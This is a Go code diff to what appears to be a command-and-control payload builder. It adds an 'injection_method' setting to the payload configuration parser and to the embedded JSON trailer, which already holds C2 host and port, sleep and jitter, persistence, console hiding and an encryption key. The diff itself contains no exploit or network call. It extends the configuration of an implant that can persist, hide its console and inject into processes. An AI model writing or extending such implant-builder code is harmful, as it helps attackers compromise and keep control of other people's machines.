@@ -787,6 +787,9 @@ func applyCustomConfig(cfg *PayloadConfig, raw string) {
 	if v := str("key", "EncryptionKey"); v != "" {
 		cfg.Key = v
 	}
+	if v := str("injection_method", "InjectionMethod"); v != "" {
+		cfg.InjectionMethod = v
+	}
 }
 
 func trailerMagic() []byte {
@@ -880,7 +883,7 @@ func marshalTrailer(cfg PayloadConfig) []byte {
 		return string(b)
 	}
 	return []byte(fmt.Sprintf(
-		`{"c2_host":%s,"c2_port":%s,"use_tls":%s,"sleep_interval":%s,"jitter":%s,"persistence":%s,"hide_console":%s,"key":%s}`,
+		`{"c2_host":%s,"c2_port":%s,"use_tls":%s,"sleep_interval":%s,"jitter":%s,"persistence":%s,"hide_console":%s,"key":%s,"injection_method":%s}`,
 		esc(cfg.C2Host),
 		esc(port),
 		esc(tf(cfg.UseTLS)),
@@ -889,6 +892,7 @@ func marshalTrailer(cfg PayloadConfig) []byte {
 		esc(tf(cfg.Persistence)),
 		esc(tf(cfg.HideConsole)),
 		esc(cfg.Key),
+		esc(cfg.InjectionMethod),
 	))
 }
 
